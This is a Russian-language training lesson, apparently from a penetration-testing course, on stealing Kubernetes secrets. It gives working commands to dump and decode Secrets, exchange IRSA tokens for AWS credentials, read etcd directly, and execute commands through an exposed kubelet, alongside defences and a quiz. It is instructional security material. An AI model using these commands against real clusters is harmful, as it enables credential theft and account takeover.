---
id: cloud-k8s-secrets
title: "Секреты Kubernetes: etcd, SA-токены и кража данных кластера"
category: cloud
parent: cloud-kubernetes-rbac
difficulty: hard
order: 1
tags: [cloud, kubernetes, secrets, etcd, serviceaccount, token, kubelet]
prerequisites: [cloud-kubernetes-rbac]
useful_for:
  - "Кража секретов Kubernetes"
  - "Понимание etcd и SA-токенов"
  - "Эксплуатация kubelet и etcd endpoints"
estimated_minutes: 35
summary: "Где хранятся секреты в Kubernetes, как читать их через API, kubelet и etcd, и как захватывать service-account токены. Практические команды и типовые мисконфиги."
---

## Задача

В прошлом уроке мы научились повышать права через RBAC. Но зачем вообще становиться админом кластера? Затем, что кластер — это **хранилище секретов**: пароли баз, токены CI, ключи, а главное — облачные креды, которыми пользуются приложения. Цель урока: из одного пода добраться до этих секретов и понять, где они физически лежат.

## Данные, с которыми работаем

Наш объект — снова под `web-7f9c-abc` с shell'ом внутри. У нас есть SA-токен по стандартному пути. В отличие от прошлого урока, у этого токена уже есть право `get secrets` — проверим и сразу им воспользуемся.

```bash
$ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
$ kubectl --token="$TOKEN" auth can-i get secrets -n prod
yes
```

## Шаг 1: читаем Secret-объекты

**Secret** — объект Kubernetes для хранения чувствительных данных. Важно понимать сразу: по умолчанию Secret **не зашифрован**, а лишь закодирован в base64. Base64 — это обратимое кодирование, не шифрование; любой, кто читает Secret, читает и данные.

Смотрим, что есть в namespace `prod`:

```bash
$ kubectl --token="$TOKEN" get secrets -n prod
NAME         TYPE     DATA   AGE
db-creds     Opaque   2      14d
aws-creds    Opaque   3      3d
```

Читаем `db-creds`. Значение лежит в поле `.data`, закодированное base64, поэтому декодируем:

```bash
$ kubectl --token="$TOKEN" get secret db-creds -n prod -o jsonpath='{.data.password}' | base64 -d
Prod_DB_S3cret!
```

Пароль базы — в руках. А теперь `aws-creds`:

```bash
$ kubectl --token="$TOKEN" get secret aws-creds -n prod -o jsonpath='{.data}' | jq -r 'to_entries[] | "\(.key)=\(.value|@base64d)"'
AWS_ACCESS_KEY_ID=AKIA...
AWS_SECRET_ACCESS_KEY=wJalr...
AWS_DEFAULT_REGION=eu-west-1
```

`jq` здесь проходит по всем парам и декодирует каждую (`@base64d`). Из одного K8s-секрета мы получили **облачные креды**. Проверяем, что они открывают:

```bash
$ aws sts get-caller-identity
{
    "Account": "111122223333",
    "Arn": "arn:aws:iam::111122223333:role/prod-app"
}
```

Это уже не «кластер» — это AWS-аккаунт прода.

## Шаг 2: откуда креды в поде — IRSA и Workload Identity

Секрет в `Secret` — статичный, «долгоживущий». Но современные кластеры выдают подам облачные креды **динамически** через механизм доверия: сервисный аккаунт Kubernetes связан с облачной ролью, и токен SA обменивается на временные креды. В AWS это **IRSA** (IAM Roles for Service Accounts).

Механика: под получает projected-токен с особым «audience» (`sts.amazonaws.com`), который можно предъявить AWS STS:

```bash
$ TOKEN=$(cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token)
$ aws sts assume-role-with-web-identity \
    --role-arn arn:aws:iam::111122223333:role/EksPodRole \
    --role-session-name pod \
    --web-identity-token "$TOKEN"
{
  "Credentials": { "AccessKeyId": "ASIA...", "Expiration": "2026-10-12T13:00:00Z" }
}
```

В GKE аналог — **Workload Identity** (`iam.gke.io/gcp-service-account`), в AKS — workload identity federation. Для атакующего разница одна: если токен украден (например, через SSRF приложения), можно встать на роль, **не имея доступа к секретам кластера**.

## Шаг 3: где секреты лежат на самом деле — etcd

Все Secret-объекты хранятся в **etcd** — распределённой базе, которая держит всё состояние кластера. API-сервер читает и пишет туда, а etcd слушает порты `2379`/`2380`. Если etcd доступен без клиентских сертификатов (а иногда он открыт), вы читаете **всё** напрямую, минуя RBAC:

```bash
$ etcdctl --endpoints=https://127.0.0.1:2379 \
    --cert=/etc/kubernetes/pki/etcd/server.crt \
    --key=/etc/kubernetes/pki/etcd/server.key \
    --cacert=/etc/kubernetes/pki/etcd/ca.crt get /registry/secrets/prod/aws-creds
/registry/secrets/prod/aws-creds
k8s:enc:aescbc:v1:key1:...
```

Обрати внимание: если включено **шифрование at-rest**, значение будет нечитаемым (`k8s:enc:...`), и на диске секрет лежит зашифрованным. Это важная защита — о ней ниже. Без шифрования здесь видны все секреты кластера разом.

## Если не сработало: kubelet как вход

**kubelet** — агент на каждой ноде, который запускает поды. Он слушает порт `10250` и умеет `exec` в контейнеры. Если авторизация настроена слабо (`--anonymous-auth=true` или режим `AlwaysAllow`), это RCE на ноде:

```bash
$ curl -sk https://10.10.20.15:10250/pods -H "Authorization: Bearer $TOKEN" | jq -r '.items[].metadata.name'
web-7f9c-abc
ci-runner-xyz
$ curl -sk https://10.10.20.15:10250/run/prod/web-7f9c-abc/web -d 'cmd=id' \
    -H "Authorization: Bearer $TOKEN"
uid=0(root) gid=0(root)
```

kubelet часто «забытый вход»: RBAC на API-сервере закрыт, а нодовый порт открыт.

## Частые ошибки и подводные камни

- **Считать Secret «защищённым» объектом.** По умолчанию он лишь base64-кодирован; шифрование at-rest — отдельная настройка, которую часто забывают включить.
- **Игнорировать kubelet как вектор.** Даже если RBAC API-сервера закрыт, порт `10250` на ноде может оставаться открытым и давать `exec` в поды.
- **Не проверять `automountServiceAccountToken`.** Токен монтируется в под автоматически, если это не отключено явно, — и его видит любой, кто получил код в контейнере.
- **Путать права пода и пользователя.** Роль, которой вы работаете через `kubectl`, и роль пода — разные; проверяйте обе отдельно.
- **Забывать про долгоживущие токены.** Legacy SA-токены не истекают и хранятся как Secret — идеальный материал для персистентности.
- **Считать, что чтение секрета видно только в аудите API.** Облачные креды из секрета дают доступ в аккаунт, где следы придётся искать уже в CloudTrail.

- **Путать чтение секрета с чтением его значения.** `kubectl get secret` без `-o jsonpath` показывает лишь base64-обёртку; декодировать нужно отдельно.

## Что мы теперь знаем

- Secret по умолчанию — лишь base64, не шифрование.
- Из `get secrets` достаются и облачные креды — прямой мост в аккаунт.
- IRSA/Workload Identity выдают креды по токену SA — их можно использовать напрямую.
- Все секреты кластера хранятся в **etcd** (2379); шифрование at-rest делает их нечитаемыми.
- **kubelet** (10250) — отдельный, часто открытый вход с RCE на ноду.
- Секреты живут и в env (`/proc/<pid>/environ`), и в смонтированных файлах.

## На что смотреть дальше

- **Admission-контроллеры** (OPA/Kyverno) — как они могут запретить чтение секретов.
- **Pod Security Admission** — уровни `baseline`/`restricted` и их обход.
- **ArgoCD/Flux**: секреты в GitOps и как они утекают через репозиторий.

## Квиз

Проверь себя.

```quiz
- question: "Где хранится «истина» о секретах Kubernetes?"
  options:
    - "В kubelet"
    - "В etcd"
    - "В Docker"
    - "В Route 53"
  answer: 1
  explanation: "etcd — хранилище состояния кластера, включая Secret."
- question: "По какому пути в поде монтируется токен service account?"
  options:
    - "/etc/passwd"
    - "/var/run/secrets/kubernetes.io/serviceaccount/token"
    - "/root/.kube"
    - "/tmp/token"
  answer: 1
  explanation: "SA-токен монтируется по этому стандартному пути."
- question: "Какой порт слушает kubelet и часто открыт без аутентификации?"
  options:
    - "2379"
    - "10250"
    - "6443"
    - "8080"
  answer: 1
  explanation: "10250 — основной API kubelet; 10255 — read-only."
- question: "Почему открытый etcd (2379) критичен?"
  options:
    - "Он отдаёт только метрики"
    - "Он отдаёт всё состояние кластера, включая секреты"
    - "Он отвечает за DNS"
    - "Он шифрует трафик"
  answer: 1
  explanation: "etcd содержит все объекты кластера, включая Secret."
- question: "Чем IRSA отличается от статичного Secret с AWS-кредами?"
  options:
    - "Она выдаёт временные креды по токену SA, а не хранит долгоживущие ключи"
    - "Она хранит пароли в открытом виде"
    - "Она работает только в Docker"
    - "Она не связана с облаком"
  answer: 0
  explanation: "IRSA обменивает projected-токен SA на временные AWS-креды через OIDC."
```

## Куда дальше

В следующем уроке мы разберём **admission-контроллеры** — OPA и Kyverno — которые пытаются не пустить тебя к этим секретам и привилегированным подам, и посмотрим, где в их правилах остаются дыры. А пока главное запомни: **в Kubernetes секрет — это не «защищённый объект», а обычная запись в etcd**, и путь к ней ведёт через RBAC, kubelet или сам etcd.

## Где пригодится

- **Пентест Kubernetes** — кража секретов и кредов.
- **Red team** — закрепление в кластере.
- **IR/Blue team** — детект доступа к Secret и kubelet.
- **DevSecOps** — шифрование etcd, внешние секрет-менеджеры.
- **Сертификации** — CKS.
